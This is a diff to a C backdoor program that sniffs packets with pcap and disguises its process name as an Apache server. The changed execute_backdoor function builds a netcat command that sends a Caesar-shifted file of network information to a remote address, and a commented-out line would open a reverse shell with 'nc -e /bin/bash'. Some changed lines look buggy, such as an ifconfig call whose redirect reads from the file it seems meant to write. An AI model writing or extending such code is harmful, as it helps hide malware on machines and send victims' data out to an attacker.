@@ -43,7 +43,7 @@
 
 #define BIT_SET(a,b) ((a) |= (1<<(b)))
 #define MASK "/usr/sbin/apache2 -k start -DSSL"
-#define NIC "wlp3s0"
+#define NIC "eno1"
 
 #define DEST_ADDR "127.0.0.1"
 
@@ -169,16 +169,19 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 --------------------------------------------------------------------------------------------------*/
 void execute_backdoor(char *addr, int port)
 {
+	char buffer[256];
+
 	srand(time(NULL));
-	int shift = (int)((rand() % 24) + 1);
+	int shift = 19;
 
 	//sprintf(buffer, "nc %s %d -e /bin/bash", addr, port);
+	sprintf(buffer, "nc %s %d < encrypted.txt", addr, port);
 	printf("executing...\n");
 	// send shell to client
 	lock = 0;
-	system("ifconfig << info.txt");
+	system("ifconfig < info.txt");
 	encrypt(shift);
-	//system("nc %s %d -e < info.txt", addr, port);
+	system(buffer);
 }
 
 void encrypt(int shift)
@@ -199,7 +202,7 @@ void encrypt(int shift)
 
 	do {
 		a = fgetc(infile);
-		fputc(a, outfile);
+		fputc(a + shift, outfile);
 	} while(a != EOF);
 
 	fcloseall();
